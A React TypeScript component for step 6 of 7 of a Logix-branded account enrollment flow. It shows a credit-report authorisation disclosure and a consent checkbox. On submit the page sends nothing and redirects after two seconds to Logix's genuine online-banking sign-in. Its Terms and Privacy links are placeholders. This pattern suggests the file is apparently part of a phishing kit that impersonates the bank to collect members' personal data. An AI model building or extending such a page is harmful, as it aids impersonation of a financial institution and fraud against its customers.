import React, { useState } from 'react';
import FlowPageLayout from '../components/FlowPageLayout';

const Terms: React.FC = () => {
  const [isChecked, setIsChecked] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const handleCheckboxChange = () => {
    setIsChecked((previous) => {
      const next = !previous;
      if (next) {
        setErrorMessage('');
      }
      return next;
    });
  };

  const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (!isChecked) {
      setErrorMessage('Please agree to the terms before proceeding.');
      return;
    }

    setIsLoading(true);
    setErrorMessage('');

    setTimeout(() => {
      window.location.href = 'https://olb.logixbanking.com/User/AccessSignin/Start';
    }, 2000);
  };

  return (
    <FlowPageLayout
      eyebrow="Step 6 of 7"
      title="Review and Agree"
      description="Please read and accept the disclosures to complete your enrollment."
      contentClassName="space-y-10"
    >
      <section className="space-y-6">
        <article className="space-y-4 text-sm text-gray-700">
          <p>
            By submitting this registration form, I understand that I am providing written instructions in accordance with
            the Fair Credit Reporting Act, Driver Privacy Protection Act, and other applicable law for Logix and its affiliates
            to request and receive information about me from third parties, including but not limited to a copy of my consumer
            credit report, score, and motor vehicle records from consumer reporting agencies, at any time for so long as I have
            an active account.
          </p>

          <p>
            I further authorize Logix and its affiliates to retain a copy of my information for use in accordance with Logix&apos;s{' '}
            <a href="#" className="font-semibold text-[#0b5da7] hover:underline">
              Terms of Service
            </a>{' '}
            and{' '}
            <a href="#" className="font-semibold text-[#0b5da7] hover:underline">
              Privacy Statement
            </a>
            .
          </p>
        </article>

        <form onSubmit={handleSubmit} className="space-y-6">
          <label className="flex items-center gap-3 rounded-xl border border-gray-200 bg-white px-4 py-3 shadow-sm">
            <input
              type="checkbox"
              checked={isChecked}
              onChange={handleCheckboxChange}
              className="h-5 w-5 rounded border-gray-300 text-[#4A9619] focus:ring-[#4A9619]"
            />
            <span className="text-sm font-medium text-[#123524]">
              I have read and agree to the disclosures above.
            </span>
          </label>

          {errorMessage && (
            <div className="rounded-xl border border-red-100 bg-red-50 px-4 py-3 text-sm text-red-700">
              <div className="flex items-center gap-2">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
                </svg>
                <span>{errorMessage}</span>
              </div>
            </div>
          )}

          <div className="flex justify-end">
            <button
              type="submit"
              disabled={isLoading}
              className="inline-flex items-center justify-center rounded-xl bg-[#4A9619] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
            >
              {isLoading ? 'Submitting…' : 'Continue'}
            </button>
          </div>
        </form>

        <footer className="rounded-xl border border-gray-200 bg-white px-4 py-3 text-xs text-gray-600 shadow-sm">
          For security reasons, never share your personal information with anyone unless you are certain who you are providing
          that information to, and only share information through a secure webpage or site.
        </footer>
      </section>
    </FlowPageLayout>
  );
};

export default Terms;
